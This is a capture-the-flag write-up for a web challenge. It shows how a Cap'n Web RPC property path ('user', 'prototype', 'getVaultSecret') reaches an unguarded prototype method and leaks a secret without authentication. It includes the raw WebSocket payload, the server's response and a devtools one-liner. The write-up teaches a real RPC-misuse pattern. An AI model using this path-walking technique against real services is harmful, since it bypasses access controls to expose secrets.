# Pink Black Vault Heist

Category: web. Points at solve: 127. Solved.

Flag: `HCMUS-CTF{wh4t_4_5cr4ppy_v4ult_pr0t0typ3!!}`

## TL;DR

The server uses Cloudflare's Cap'n Web RPC over WebSocket (`ws://host/rpc`) and
exposes the `UserApi` class as the `user` capability. Cap'n Web resolves a
`pipeline` call's property path step by step from the served object, then
invokes the resulting function. Sending the path

```
["user", "prototype", "getVaultSecret"]
```

walks to `UserApi.prototype.getVaultSecret`, a function that reads the
module-level `VAULT_KEY` (the flag) and returns it. No `this` is used, no
arguments are needed, and the admin check on `openVault` is never reached.

## Setup

The instance spawned at `http://chall.blackpinker.com:<port>`. The frontend
calls `connect('ws://host/rpc')` from `connection.js`, a bundled
`cloudflare/capnweb` client, and exposes three capabilities:

- `api.system.*`  → `SystemApi` (ping / serverTime / version)
- `api.auth.*`    → `AuthApi` (register / login / userCount)
- `api.user.*`    → `UserApi` (openVaults / audit / whoAmI static methods)

## Source review (key files)

### config.js

```js
export const JWT_SECRET = crypto.randomBytes(5);    // red herring, 40-bit
export const JWT_ALG = "HS256";                     // exported, never used
export const PWD_SALT = "p1nkbl4ck_s4lt_v3";
export const VAULT_KEY = process.env.FLAG || "HCMUS-CTF{fakeflag}";
export const ADMIN_BOOTSTRAP_PASSWORD = crypto.randomBytes(32).toString('hex');
```

`JWT_SECRET = crypto.randomBytes(5)` looks intentionally small (40 bits) but
this is a distraction. Brute-forcing 2^40 HMAC-SHA256 in a 1-hour instance
window without a GPU is not the intended path.

### vault.js (relevant excerpt)

```js
import { VAULT_KEY } from './config.js';

export class UserApi {
  static openVaults(token, key) { return new this(token).openVault(key); }
  static audit(token)           { return new this(token).getAuditLog(); }
  static whoAmI(token)          { return new this(token).me(); }

  constructor(token) { this.session = verifyJWT(token); }

  openVault(key) {
    if (!this.session?.isAdmin) throw new Error("admin access required");
    const success = key == this.getVaultSecret();
    /* ... audit + success/failure response, success branch leaks VAULT_KEY ... */
  }

  getAuditLog() {
    if (!this.session?.isAdmin) throw new Error("admin access required");
    return { entries: AUDIT_LOG.slice(-50) };
  }

  me()             { return this.session; }
  getVaultSecret() { return VAULT_KEY; }   // <-- no auth check, no `this`
}
```

The auth gate lives on the `openVault` instance method, not on
`getVaultSecret`. `getVaultSecret` is a plain accessor for the module-level
`VAULT_KEY` and never reads `this`, so calling it bound to *anything* (or to
nothing) returns the flag.

The static methods are the only ones reachable through the documented API
surface (`openVaults`, `audit`, `whoAmI`). The instance methods are
"internal". That is the lie the challenge tells.

## Cap'n Web property-path quirk

Cap'n Web (`cloudflare/capnweb`) dispatches client calls as
`["pipeline", target_id, path, args]` messages. `path` is an array of property
names walked from the target. The library does not whitelist which properties
on the served object are reachable - it walks the path on the live JS object,
then invokes whatever it lands on. So when the server registers `user:
UserApi`, the client can address any property reachable from `UserApi`,
including `UserApi.prototype`.

Prototype methods on a class live on `Class.prototype`. So:

```
UserApi.prototype.getVaultSecret  ===  the instance method getVaultSecret
```

Invoking `UserApi.prototype.getVaultSecret()` runs the function with
`this === undefined` (in strict module code). Because the function never
reads `this`, it works fine and returns `VAULT_KEY`.

## Exploit

Bare WebSocket payload, no auth required:

```json
["push", ["pipeline", 0, ["user","prototype","getVaultSecret"], []]]
["pull", 1]
```

Server response:

```json
["resolve", 1, "HCMUS-CTF{wh4t_4_5cr4ppy_v4ult_pr0t0typ3!!}"]
```

Done. No JWT, no register, no login, no brute force.

In-browser one-liner (drop into devtools on the instance page):

```js
const ws = new WebSocket(`ws://${location.host}/rpc`);
ws.onopen = () => {
  ws.send(JSON.stringify(["push", ["pipeline", 0, ["user","prototype","getVaultSecret"], []]]));
  ws.send(JSON.stringify(["pull", 1]));
};
ws.onmessage = e => console.log(e.data);
```

## Why the red herrings looked tempting

1. `JWT_SECRET = crypto.randomBytes(5)` screams "brute force me." It is the
   loudest signpost in the dist, and a 40-bit HMAC key is the kind of thing
   hashcat eats for breakfast. But the real flaw is not in the crypto - it is
   in how the RPC layer reaches into the class.
2. The static API explicitly gates `openVault` and `getAuditLog` behind
   `isAdmin`. It reads like a complete API. The instance method that doesn't
   gate anything (`getVaultSecret`) feels like a private helper.
3. The audit-log story (`absent admin entries`, `key_rotate`, etc.) frames
   the challenge as "become admin." That framing keeps you on the JWT path
   instead of the RPC path.

The point-cost (132/500, 64 solves at solve time) is consistent with a
"recognize the misuse pattern of a novel RPC library" challenge rather than
a "burn GPU hours" challenge.

## Files

- `Pink_Black_Vault_Heist-dist.zip` - challenge dist (auth/config/crypto/
  system/user-store/vault .js)
